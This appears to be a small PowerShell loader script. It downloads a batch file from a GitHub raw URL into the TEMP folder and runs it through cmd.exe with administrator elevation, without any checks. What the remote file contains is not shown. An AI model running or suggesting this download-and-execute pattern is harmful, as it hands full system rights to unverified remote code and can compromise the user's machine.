$cmdUrl = "https://raw.githubusercontent.com/mt-official/MT/main/coral.bat"
$cmdPath = "$env:TEMP\cwe.cmd"

Write-Host "Downloading..." -ForegroundColor Cyan

Invoke-WebRequest $cmdUrl -OutFile $cmdPath

Write-Host "Running..." -ForegroundColor Yellow

Start-Process cmd.exe -ArgumentList "/c `"$cmdPath`"" -Verb RunAs
